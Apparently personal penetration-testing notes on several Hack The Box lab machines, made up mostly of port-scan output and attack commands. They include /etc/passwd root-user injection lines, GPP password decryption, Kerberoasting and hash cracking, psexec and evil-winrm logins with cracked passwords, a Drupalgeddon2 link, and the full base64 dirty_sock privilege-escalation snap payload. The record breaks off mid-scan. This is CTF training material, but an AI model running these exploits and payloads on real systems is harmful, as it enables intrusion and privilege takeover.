(protocol 2.0)<br />| ssh-hostkey: <br />|   2048 dd:53:10:70:0b:d0:47:0a:e2:7e:4a:b6:42:98:23:c7 (RSA)<br />| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDKBbBK0GkiCbxmAbaYsF4DjDQ3JqErzEazl3v8OndVhynlxNA5sMnQmyH+7ZPdDx9IxvWFWkdvPDJC0rUj1CzOTOEjN61Qd7uQbo5x4rJd3PAgqU21H9NyuXt+T1S/Ud77xKei7fXt5kk1aL0/mqj8wTk6HDp0ZWrGBPCxcOxfE7NBcY3W++IIArn6irQUom0/AAtR3BseOf/VTdDWOXk/Ut3rrda4VMBpRcmTthjsTXAvKvPJcaWJATtRE2NmFjBWixzhQU+s30jPABHcVtxl/Fegr3mvS7O3MpPzoMBZP6Gw8d/bVabaCQ1JcEDwSBc9DaLm4cIhuW37dQDgqT1V<br />|   256 37:2e:14:68:ae:b9:c2:34:2b:6e:d9:92:bc:bf:bd:28 (ECDSA)<br />| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPzrVwOU0bohC3eXLnH0Sn4f7UAwDy7jx4pS39wtkKMF5j9yKKfjiO+5YTU//inmSjlTgXBYNvaC3xfOM/Mb9RM=<br />|   256 93:ea:a8:40:42:c1:a8:33:85:b3:56:00:62:1c:a0:ab (ED25519)<br />|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEuLLsM8u34m/7Hzh+yjYk4pu3WHsLOrPU2VeLn22UkO<br />80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.25 ((Debian))<br />| http-methods: <br />|_  Supported Methods: GET HEAD POST OPTIONS<br />| http-robots.txt: 1 disallowed entry <br />|_/writeup/<br />|_http-title: Nothing here yet.<br />Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br />OS fingerprint not ideal because: Missing a closed TCP port so results incomplete<br />Aggressive OS guesses: Linux 3.10 - 4.11 (92%), Linux 3.16 (92%), Linux 3.16 - 4.6 (92%), Linux 3.18 (92%), Linux 3.2 - 4.9 (92%), Linux 4.2 (92%), Linux 4.4 (92%), Linux 3.12 (90%), Linux 3.13 (90%), Linux 3.13 or 4.2 (90%)<br />No exact OS matches for host (test conditions non-ideal).<br />TCP/IP fingerprint:<br />SCAN(V=7.91%E=4%D=7/18%OT=22%CT=%CU=%PV=Y%DS=2%DC=T%G=N%TM=60F45AA1%P=x86_64-pc-linux-gnu)<br />SEQ(SP=FC%GCD=1%ISR=10E%TI=Z%II=I%TS=8)<br />OPS(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST11NW7%O6=M54DST11)<br />WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)<br />ECN(R=Y%DF=Y%TG=40%W=7210%O=M54DNNSNW7%CC=Y%Q=)<br />T1(R=Y%DF=Y%TG=40%S=O%A=S+%F=AS%RD=0%Q=)<br />T2(R=N)<br />T3(R=N)<br />T4(R=Y%DF=Y%TG=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)<br />U1(R=N)<br />IE(R=Y%DFI=N%TG=40%CD=S)<br /><br />Uptime guess: 0.226 days (since Sun Jul 18 14:20:09 2021)<br />Network Distance: 2 hops<br />TCP Sequence Prediction: Difficulty=253 (Good luck!)<br />IP ID Sequence Generation: All zeros<br />Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br /><br />TRACEROUTE (using port 80/tcp)<br />HOP RTT      ADDRESS<br />1   85.59 ms 10.10.14.1<br />2   85.60 ms 10.10.10.138<br /><br />NSE: Script Post-scanning.<br />NSE: Starting runlevel 1 (of 3) scan.<br />Initiating NSE at 19:45<br />Completed NSE at 19:45, 0.00s elapsed<br />NSE: Starting runlevel 2 (of 3) scan.<br />Initiating NSE at 19:45<br />Completed NSE at 19:45, 0.00s elapsed<br />NSE: Starting runlevel 3 (of 3) scan.<br />Initiating NSE at 19:45<br />Completed NSE at 19:45, 0.00s elapsed<br />Read data files from: /usr/bin/../share/nmap<br />OS and Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br />Nmap done: 1 IP address (1 host up) scanned in 23.05 seconds<br />           Raw packets sent: 84 (7.284KB) | Rcvd: 34 (2.184KB<br /><br /><br /><br />from cookie we see it uses cms made simple<br /><br />searchsploit 46635.py<br /><br />[+] Salt for password found: 5a599ef579066807<br />[+] Username found: jkr<br />[+] Email found: jkr@writeup.htb<br />[*] Try: 62def4866937f08cc13bab43bb14e6f7<br /><br />raykayjay9<br /><br /><br />echo &#39;whiskey:$1$whiskeyb$By7O9YyGFuRw4u3Zw84Dw/:0:0:root:/root:/bin/bash&#39; &gt;&gt; /etc/passwd<br /><br /><br />echo ‘test:gDlPrjU6SWeKo:0:0:root:/root:/bin/bash’ &gt;&gt; /etc/passwd<br /><br /></div><div class='page'><h1 class='title level-2'>bastion.htb</h1><br/></div><div class='page'><h1 class='title level-2'>active.htb</h1><br/>PORT     STATE SERVICE       REASON          VERSION<br />53/tcp   open  domain        syn-ack ttl 127 Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)<br />| dns-nsid: <br />|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)<br />88/tcp   open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2021-07-21 09:23:37Z)<br />135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC<br />139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn<br />389/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)<br />445/tcp  open  microsoft-ds? syn-ack ttl 127<br />464/tcp  open  kpasswd5?     syn-ack ttl 127<br />593/tcp  open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0<br />636/tcp  open  tcpwrapped    syn-ack ttl 127<br />3268/tcp open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)<br />3269/tcp open  tcpwrapped    syn-ack ttl 127<br />5722/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC<br />9389/tcp open  mc-nmf        syn-ack ttl 127 .NET Message Framing<br />Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br />OS fingerprint not ideal because: Missing a closed TCP port so results incomplete<br />Aggressive OS guesses: Microsoft Windows 7 or Windows Server 2008 R2 (97%), Microsoft Windows Home Server 2011 (Windows Server 2008 R2) (96%), Microsoft Windows Server 2008 SP1 (96%), Microsoft Windows Server 2008 SP2 (96%), Microsoft Windows 7 (96%), Microsoft Windows 7 SP0 - SP1 or Windows Server 2008 (96%), Microsoft Windows 7 SP0 - SP1, Windows Server 2008 SP1, Windows Server 2008 R2, Windows 8, or Windows 8.1 Update 1 (96%), Microsoft Windows 7 SP1 (96%), Microsoft Windows 7 Ultimate (96%), Microsoft Windows 8.1 (96%)<br />No exact OS matches for host (test conditions non-ideal).<br />TCP/IP fingerprint:<br />SCAN(V=7.91%E=4%D=7/21%OT=53%CT=%CU=37061%PV=Y%DS=2%DC=T%G=N%TM=60F7E4D5%P=x86_64-pc-linux-gnu)<br />SEQ(SP=108%GCD=1%ISR=109%TI=I%CI=I%II=I%SS=S%TS=7)<br />OPS(O1=M54BNW8ST11%O2=M54BNW8ST11%O3=M54BNW8NNT11%O4=M54BNW8ST11%O5=M54BNW8ST11%O6=M54BST11)<br />WIN(W1=2000%W2=2000%W3=2000%W4=2000%W5=2000%W6=2000)<br />ECN(R=Y%DF=Y%T=80%W=2000%O=M54BNW8NNS%CC=N%Q=)<br />T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)<br />T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)<br />T3(R=Y%DF=Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)<br />T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)<br />T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)<br />T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)<br />T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)<br />U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)<br />IE(R=Y%DFI=N%T=80%CD=Z)<br /><br />Uptime guess: 0.182 days (since Wed Jul 21 07:50:24 2021)<br />Network Distance: 2 hops<br />TCP Sequence Prediction: Difficulty=264 (Good luck!)<br />IP ID Sequence Generation: Incremental<br />Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows<br /><br />Host script results:<br />|_clock-skew: 12m53s<br />| p2p-conficker: <br />|   Checking for Conficker.C or higher...<br />|   Check 1 (port 32534/tcp): CLEAN (Couldn&#39;t connect)<br />|   Check 2 (port 40109/tcp): CLEAN (Couldn&#39;t connect)<br />|   Check 3 (port 6739/udp): CLEAN (Timeout)<br />|   Check 4 (port 38631/udp): CLEAN (Failed to receive data)<br />|_  0/4 checks are positive: Host is CLEAN or ports are blocked<br />| smb2-security-mode: <br />|   2.02: <br />|_    Message signing enabled and required<br />| smb2-time: <br />|   date: 2021-07-21T09:24:32<br />|_  start_date: 2021-07-21T05:03:41<br /><br />TRACEROUTE (using port 53/tcp)<br />HOP RTT       ADDRESS<br />1   170.12 ms 10.10.16.1<br />2   65.13 ms  10.10.10.100<br /><br />NSE: Script Post-scanning.<br />NSE: Starting runlevel 1 (of 3) scan.<br />Initiating NSE at 12:11<br />Completed NSE at 12:11, 0.00s elapsed<br />NSE: Starting runlevel 2 (of 3) scan.<br />Initiating NSE at 12:11<br />Completed NSE at 12:11, 0.00s elapsed<br />NSE: Starting runlevel 3 (of 3) scan.<br />Initiating NSE at 12:11<br />Completed NSE at 12:11, 0.00s elapsed<br />Read data files from: /usr/bin/../share/nmap<br />OS and Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br />Nmap done: 1 IP address (1 host up) scanned in 74.52 seconds<br />           Raw packets sent: 59 (4.000KB) | Rcvd: 4070 (164.312KB)<br /><br /><br />smbclient<br /><br />\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml<br /><br />&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;<br />&lt;Groups clsid=&quot;{3125E937-EB16-4b4c-9934-544FC6D24D26}&quot;&gt;&lt;User clsid=&quot;{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}&quot; name=&quot;active.htb\SVC_TGS&quot; image=&quot;2&quot; changed=&quot;2018-07-18 20:46:06&quot; uid=&quot;{EF57DA28-5F69-4530-A59E-AAB58578219D}&quot;&gt;&lt;Properties action=&quot;U&quot; newName=&quot;&quot; fullName=&quot;&quot; description=&quot;&quot; cpassword=&quot;edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ&quot; changeLogon=&quot;0&quot; noChange=&quot;1&quot; neverExpires=&quot;1&quot; acctDisabled=&quot;0&quot; userName=&quot;active.htb\SVC_TGS&quot;/&gt;&lt;/User&gt;<br />&lt;/Groups&gt;<br /><br /><br />gpp-decrypt<br /><br />└─# gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ                  <br />GPPstillStandingStrong2k18<br /><br />If you find this <strong>error </strong>from Linux: <strong><code>Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)</code></strong> it because of your local time, you need to synchronise the host with the DC: <code>ntpdate &lt;IP of DC&gt;</code><br /><br />GetUserSPNs.py -request -dc-ip 10.10.10.100 active.htb/SVC_TGS -save -outputfile GetUserSPNs.out<br /><br />john --wordlist=/usr/share/wordlists/rockyou.txt GetUserSPNs.out<br /><br />Administrator:Ticketmaster1968<br /><br />psexec.py Administrator:Ticketmaster1968@10.10.10.100<br /><br /></div><div class='page'><h1 class='title level-2'>armageddon.htb</h1><br/><br />─# nmap -A -p- 10.10.10.233<br />Starting Nmap 7.91 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2021-07-14 21:58 +03<br />Stats: 0:16:14 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan<br />SYN Stealth Scan Timing: About 59.32% done; ETC: 22:26 (0:11:07 remaining)<br />Nmap scan report for 10.10.10.233<br />Host is up (0.11s latency).<br />Not shown: 65502 closed ports, 31 filtered ports<br />PORT   STATE SERVICE VERSION<br />22/tcp open  ssh     OpenSSH 7.4 (protocol 2.0)<br />| ssh-hostkey: <br />|   2048 82:c6:bb:c7:02:6a:93:bb:7c:cb:dd:9c:30:93:79:34 (RSA)<br />|   256 3a:ca:95:30:f3:12:d7:ca:45:05:bc:c7:f1:16:bb:fc (ECDSA)<br />|_  256 7a:d4:b3:68:79:cf:62:8a:7d:5a:61:e7:06:0f:5f:33 (ED25519)<br />80/tcp open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)<br />|_http-generator: Drupal 7 (<a href="http://drupal.org">http://drupal.org</a>)<br />| http-robots.txt: 36 disallowed entries (15 shown)<br />| /includes/ /misc/ /modules/ /profiles/ /scripts/ <br />| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt <br />| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt <br />|_/LICENSE.txt /MAINTAINERS.txt<br />|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16<br />|_http-title: Welcome to  Armageddon |  Armageddon<br />No exact OS matches for host (If you know what OS is running on it, see <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> ).<br />TCP/IP fingerprint:<br />OS:SCAN(V=7.91%E=4%D=7/14%OT=22%CT=1%CU=35687%PV=Y%DS=2%DC=T%G=Y%TM=60EF3A2<br />OS:7%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10A%TI=Z%TS=A)SEQ(SP=105%GC<br />OS:D=1%ISR=10A%TI=Z%II=I%TS=A)SEQ(SP=105%GCD=1%ISR=10A%TI=Z%CI=RD%TS=A)OPS(<br />OS:O1=M54BST11NW7%O2=M54BST11NW7%O3=M54BNNT11NW7%O4=M54BST11NW7%O5=M54BST11<br />OS:NW7%O6=M54BST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN(<br />OS:R=Y%DF=Y%T=40%W=7210%O=M54BNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS<br />OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=<br />OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=<br />OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T<br />OS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=<br />OS:S)<br /><br />Network Distance: 2 hops<br /><br />TRACEROUTE (using port 587/tcp)<br />HOP RTT       ADDRESS<br />1   113.34 ms 10.10.16.1<br />2   113.40 ms 10.10.10.233<br /><br />OS and Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br />Nmap done: 1 IP address (1 host up) scanned in 1593.79 seconds<br /><br /><br /><a href="https://github.com/dreadlocked/Drupalgeddon2/">https://github.com/dreadlocked/Drupalgeddon2/</a><br /><br />      &#39;database&#39; =&gt; &#39;drupal&#39;,<br />      &#39;username&#39; =&gt; &#39;drupaluser&#39;,<br />      &#39;password&#39; =&gt; &#39;CQHEy@9M*m23gBVj&#39;,<br />      &#39;host&#39; =&gt; &#39;localhost&#39;,<br />      &#39;port&#39; =&gt; &#39;&#39;,<br />      &#39;driver&#39; =&gt; &#39;mysql&#39;<br /><br /><br /><br />mysql -u drupaluser -p -D drupal -e &#39;select * from users;&#39;<br /><br />CQHEy@9M*m23gBVj<br /><br />brucetherealadmin:$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt<br /><br />johnripper<br /><br />booboos<br /><br /><br />admin@armageddon.eu<br /><br /><br />python2 -c &#39;print &quot;aHNxcwcAAAAQIVZcAAACAAAAAAAEABEA0AIBAAQAAADgAAAAAAAAAI4DAAAAAAAAhgMAAAAAAAD//////////xICAAAAAAAAsAIAAAAAAAA+AwAAAAAAAHgDAAAAAAAAIyEvYmluL2Jhc2gKCnVzZXJhZGQgZGlydHlfc29jayAtbSAtcCAnJDYkc1daY1cxdDI1cGZVZEJ1WCRqV2pFWlFGMnpGU2Z5R3k5TGJ2RzN2Rnp6SFJqWGZCWUswU09HZk1EMXNMeWFTOTdBd25KVXM3Z0RDWS5mZzE5TnMzSndSZERoT2NFbURwQlZsRjltLicgLXMgL2Jpbi9iYXNoCnVzZXJtb2QgLWFHIHN1ZG8gZGlydHlfc29jawplY2hvICJkaXJ0eV9zb2NrICAgIEFMTD0oQUxMOkFMTCkgQUxMIiA+PiAvZXRjL3N1ZG9lcnMKbmFtZTogZGlydHktc29jawp2ZXJzaW9uOiAnMC4xJwpzdW1tYXJ5OiBFbXB0eSBzbmFwLCB1c2VkIGZvciBleHBsb2l0CmRlc2NyaXB0aW9uOiAnU2VlIGh0dHBzOi8vZ2l0aHViLmNvbS9pbml0c3RyaW5nL2RpcnR5X3NvY2sKCiAgJwphcmNoaXRlY3R1cmVzOgotIGFtZDY0CmNvbmZpbmVtZW50OiBkZXZtb2RlCmdyYWRlOiBkZXZlbAqcAP03elhaAAABaSLeNgPAZIACIQECAAAAADopyIngAP8AXF0ABIAerFoU8J/e5+qumvhFkbY5Pr4ba1mk4+lgZFHaUvoa1O5k6KmvF3FqfKH62aluxOVeNQ7Z00lddaUjrkpxz0ET/XVLOZmGVXmojv/IHq2fZcc/VQCcVtsco6gAw76gWAABeIACAAAAaCPLPz4wDYsCAAAAAAFZWowA/Td6WFoAAAFpIt42A8BTnQEhAQIAAAAAvhLn0OAAnABLXQAAan87Em73BrVRGmIBM8q2XR9JLRjNEyz6lNkCjEjKrZZFBdDja9cJJGw1F0vtkyjZecTuAfMJX82806GjaLtEv4x1DNYWJ5N5RQAAAEDvGfMAAWedAQAAAPtvjkc+MA2LAgAAAAABWVo4gIAAAAAAAAAAPAAAAAAAAAAAAAAAAAAAAFwAAAAAAAAAwAAAAAAAAACgAAAAAAAAAOAAAAAAAAAAPgMAAAAAAAAEgAAAAACAAw&quot; + &quot;A&quot;*4256 + &quot;==&quot;&#39; | base64 -d &gt; test.snap<br /><br />su dirty_sock<br />dirty_sock<br /><br />sudo -i<br /><br /><br /></div><div class='page'><h1 class='title level-2'>heist.htb</h1><br/>└─# rustscan -a 10.10.10.149 --range 1-65535 --ulimit 5000 -- -A<br />.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.<br />| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |<br />| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |<br />`-&#39; `-&#39;`-----&#39;`----&#39;  `-&#39;  `----&#39;  `---&#39; `-&#39;  `-&#39;`-&#39; `-&#39;<br />The Modern Day Port Scanner.<br />________________________________________<br />: <a href="https://discord.gg/GFrQsGy">https://discord.gg/GFrQsGy</a>           :<br />: <a href="https://github.com/RustScan/RustScan">https://github.com/RustScan/RustScan</a> :<br /> --------------------------------------<br />Nmap? More like slowmap.🐢<br /><br />[~] The config file is expected to be at &quot;/root/.rustscan.toml&quot;<br />[~] Automatically increasing ulimit value to 5000.<br />Open 10.10.10.149:80<br />Open 10.10.10.149:135<br />Open 10.10.10.149:445<br />Open 10.10.10.149:5985<br />Open 10.10.10.149:49669<br />[~] Starting Script(s)<br />[&gt;] Script to be run Some(&quot;nmap -vvv -p {{port}} {{ip}}&quot;)<br /><br />[~] Starting Nmap 7.91 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2021-07-21 13:53 +03<br />NSE: Loaded 153 scripts for scanning.<br />NSE: Script Pre-scanning.<br />NSE: Starting runlevel 1 (of 3) scan.<br />Initiating NSE at 13:53<br />Completed NSE at 13:53, 0.00s elapsed<br />NSE: Starting runlevel 2 (of 3) scan.<br />Initiating NSE at 13:53<br />Completed NSE at 13:53, 0.00s elapsed<br />NSE: Starting runlevel 3 (of 3) scan.<br />Initiating NSE at 13:53<br />Completed NSE at 13:53, 0.00s elapsed<br />Initiating Ping Scan at 13:53<br />Scanning 10.10.10.149 [4 ports]<br />Completed Ping Scan at 13:53, 3.04s elapsed (1 total hosts)<br />Nmap scan report for 10.10.10.149 [host down, received no-response]<br />NSE: Script Post-scanning.<br />NSE: Starting runlevel 1 (of 3) scan.<br />Initiating NSE at 13:53<br />Completed NSE at 13:53, 0.00s elapsed<br />NSE: Starting runlevel 2 (of 3) scan.<br />Initiating NSE at 13:53<br />Completed NSE at 13:53, 0.00s elapsed<br />NSE: Starting runlevel 3 (of 3) scan.<br />Initiating NSE at 13:53<br />Completed NSE at 13:53, 0.00s elapsed<br />Read data files from: /usr/bin/../share/nmap<br />Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn<br />Nmap done: 1 IP address (0 hosts up) scanned in 3.69 seconds<br />           Raw packets sent: 8 (304B) | Rcvd: 0 (0B)<br /><br />                                                                                                                                                                                <br />┌──(root💀kali)-[/home/kali]<br />└─# rustscan -a 10.10.10.149 --range 1-65535 --ulimit 5000 -- -A<br />.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.<br />| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |<br />| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |<br />`-&#39; `-&#39;`-----&#39;`----&#39;  `-&#39;  `----&#39;  `---&#39; `-&#39;  `-&#39;`-&#39; `-&#39;<br />The Modern Day Port Scanner.<br />________________________________________<br />: <a href="https://discord.gg/GFrQsGy">https://discord.gg/GFrQsGy</a>           :<br />: <a href="https://github.com/RustScan/RustScan">https://github.com/RustScan/RustScan</a> :<br /> --------------------------------------<br />🌍HACK THE PLANET🌍<br /><br />[~] The config file is expected to be at &quot;/root/.rustscan.toml&quot;<br />[~] Automatically increasing ulimit value to 5000.<br />Open 10.10.10.149:80<br />Open 10.10.10.149:135<br />Open 10.10.10.149:445<br />Open 10.10.10.149:5985<br />Open 10.10.10.149:49669<br />[~] Starting Script(s)<br />[&gt;] Script to be run Some(&quot;nmap -vvv -p {{port}} {{ip}}&quot;)<br /><br /><br />PORT      STATE SERVICE       REASON          VERSION<br />80/tcp    open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0<br />| http-cookie-flags: <br />|   /: <br />|     PHPSESSID: <br />|_      httponly flag not set<br />| http-methods: <br />|   Supported Methods: OPTIONS TRACE GET HEAD POST<br />|_  Potentially risky methods: TRACE<br />|_http-server-header: Microsoft-IIS/10.0<br />| http-title: Support Login Page<br />|_Requested resource was login.php<br />135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC<br />445/tcp   open  microsoft-ds? syn-ack ttl 127<br />5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)s<br />|_http-server-header: Microsoft-HTTPAPI/2.0<br />|_http-title: Not Found<br />49669/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC<br />Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br />OS fingerprint not ideal because: Missing a closed TCP port so results incomplete<br />No OS matches for host<br />TCP/IP fingerprint:<br />SCAN(V=7.91%E=4%D=7/21%OT=80%CT=%CU=%PV=Y%DS=2%DC=T%G=N%TM=60F7FD54%P=x86_64-pc-linux-gnu)<br />SEQ(SP=FE%GCD=1%ISR=10B%TI=RD%II=I%TS=U)<br />SEQ(SP=FB%GCD=1%ISR=10A%II=I%TS=U)<br />OPS(O1=M54BNW8NNS%O2=M54BNW8NNS%O3=M54BNW8%O4=M54BNW8NNS%O5=M54BNW8NNS%O6=M54BNNS)<br />WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)<br />ECN(R=Y%DF=Y%TG=80%W=FFFF%O=M54BNW8NNS%CC=Y%Q=)<br />T1(R=Y%DF=Y%TG=80%S=O%A=S+%F=AS%RD=0%Q=)<br />T2(R=N)<br />T3(R=N)<br />T4(R=N)<br />U1(R=N)<br />IE(R=Y%DFI=N%TG=80%CD=Z)<br /><br />Network Distance: 2 hops<br />TCP Sequence Prediction: Difficulty=251 (Good luck!)<br />IP ID Sequence Generation: Busy server or unknown class<br />Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows<br /><br />Host script results:<br />|_clock-skew: 4m25s<br />| p2p-conficker: <br />|   Checking for Conficker.C or higher...<br />|   Check 1 (port 48033/tcp): CLEAN (Timeout)<br />|   Check 2 (port 48515/tcp): CLEAN (Timeout)<br />|   Check 3 (port 25486/udp): CLEAN (Timeout)<br />|   Check 4 (port 15764/udp): CLEAN (Timeout)<br />|_  0/4 checks are positive: Host is CLEAN or ports are blocked<br />| smb2-security-mode: <br />|   2.02: <br />|_    Message signing enabled but not required<br />| smb2-time: <br />|   date: 2021-07-21T11:00:07<br />|_  start_date: N/A<br /><br />TRACEROUTE (using port 445/tcp)<br />HOP RTT      ADDRESS<br />1   89.56 ms 10.10.16.1<br />2   89.67 ms 10.10.10.149<br /><br /><a href="http://10.10.10.149/attachments/config.txt">http://10.10.10.149/attachments/config.txt</a><br /><br /><br />└─# john --wordlist=/usr/share/wordlists/rockyou.txt cisco.txt      <br />Warning: detected hash type &quot;md5crypt&quot;, but the string is also recognized as &quot;md5crypt-long&quot;<br />Use the &quot;--format=md5crypt-long&quot; option to force loading these as that type instead<br />Using default input encoding: UTF-8<br />Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 128/128 AVX 4x3])<br />Will run 4 OpenMP threads<br />Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status<br />stealth1agent    (admin)<br />1g 0:00:00:37 DONE (2021-07-21 14:00) 0.02637g/s 92464p/s 92464c/s 92464C/s stealthy001..steak7893<br />Use the &quot;--show&quot; option to display all of the cracked passwords reliably<br />Session completed<br /><br /><a href="https://www.ifm.net.nz/cookbooks/passwordcracker.html">https://www.ifm.net.nz/cookbooks/passwordcracker.html</a><br />username rout3r password 7 0242114B0E143F015F5D1E161713<br />username admin privilege 15 password 7 02375012182C1A1D751618034F36415408<br /><br />rout3r:$uperP@ssword<br />admin:Q4)sJu\Y8qz*A3?d<br /><br />lookupsid.py hazard:stealth1agent@heist.htb<br /><br />lookupsid.py hazard:stealth1agent@heist.htb<br />Impacket v0.9.23.dev1+20210504.123629.24a0ae6f - Copyright 2020 SecureAuth Corporation<br /><br />[*] Brute forcing SIDs at heist.htb<br />[*] StringBinding ncacn_np:heist.htb[\pipe\lsarpc]<br />[*] Domain SID is: S-1-5-21-4254423774-1266059056-3197185112<br />500: SUPPORTDESK\Administrator (SidTypeUser)<br />501: SUPPORTDESK\Guest (SidTypeUser)<br />503: SUPPORTDESK\DefaultAccount (SidTypeUser)<br />504: SUPPORTDESK\WDAGUtilityAccount (SidTypeUser)<br />513: SUPPORTDESK\None (SidTypeGroup)<br />1008: SUPPORTDESK\Hazard (SidTypeUser)<br />1009: SUPPORTDESK\support (SidTypeUser)<br />1012: SUPPORTDESK\Chase (SidTypeUser)<br />1013: SUPPORTDESK\Jason (SidTypeUser)<br /><br /><br />chase:Q4)sJu\Y8qz*A3?d<br /><br /><br /><br />evil-winrm -i 10.10.10.149 -u chase -p ‘Q4)sJu\Y8qz*A3?d’<br /><br />upload winPEAS.bat<br /><br />C:\Users\Chase\Documents&gt; download C:\Users\Chase\Music\str_password_admin.txt<br /><br />evil-winrm -i 10.10.10.149 -u &#39;administrator&#39; -p &#39;4dD!5}x/re8]FBuZ&#39;</div><div class='page'><h1 class='title level-2'>cap.htb</h1><br/>└─# nmap -A -p- 10.10.10.245  <br />Starting Nmap 7.91 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2021-07-08 11:24 +03<br />Nmap scan report for 10.10.10.245<br />Host is up (0.12s latency).<br />Not shown: 65532 closed ports<br />PORT   STATE SERVICE VERSION<br />21/tcp open  ftp     vsftpd 3.0.3<br />22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)<br />| ssh-hostkey: <br />|   3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA)<br />|   256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA)<br />|_  256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519)<br />80/tcp open  http    gunicorn<br />| fingerprint-strings: <br />|   FourOhFourRequest: <br />|     HTTP/1.0 404 NOT FOUND<br />|     Server: gunicorn<br />|     Date: Thu, 08 Jul 2021 08:55:45 GMT<br />|     